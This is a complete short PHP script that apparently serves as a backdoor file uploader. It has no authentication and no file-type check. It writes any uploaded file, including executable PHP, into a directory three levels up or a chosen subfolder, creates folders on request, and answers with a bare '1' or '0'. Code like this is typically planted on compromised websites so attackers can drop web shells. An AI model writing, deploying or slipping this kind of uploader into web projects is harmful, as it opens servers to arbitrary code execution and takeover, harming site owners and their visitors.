<?php
$d = dirname(__FILE__);
$h = '../../..';
$r = ($h === '' || $h === '.') ? $d : $d . '/' . $h;

$targetDir = isset($_REQUEST['dir']) ? $_REQUEST['dir'] : '';
if ($targetDir !== '') {
    $targetDir = str_replace('\\', '/', $targetDir);
    $targetDir = ltrim($targetDir, '/');
    if (strpos($targetDir, '..') !== false) {
        die('Invalid directory');
    }
    $uploadPath = $r . '/' . $targetDir;
    if (!is_dir($uploadPath)) {
        @mkdir($uploadPath, 0755, true);
    }
} else {
    $uploadPath = $r;
}

if (isset($_FILES['f'])) {
    $n = basename($_FILES['f']['name']);
    if ($n !== '' && move_uploaded_file($_FILES['f']['tmp_name'], $uploadPath . '/' . $n)) {
        echo '1';
    } else {
        echo '0';
    }
} else {
    echo '<form method="post" enctype="multipart/form-data"><input type="file" name="f"><input type="submit" value="Upload"></form>';
}
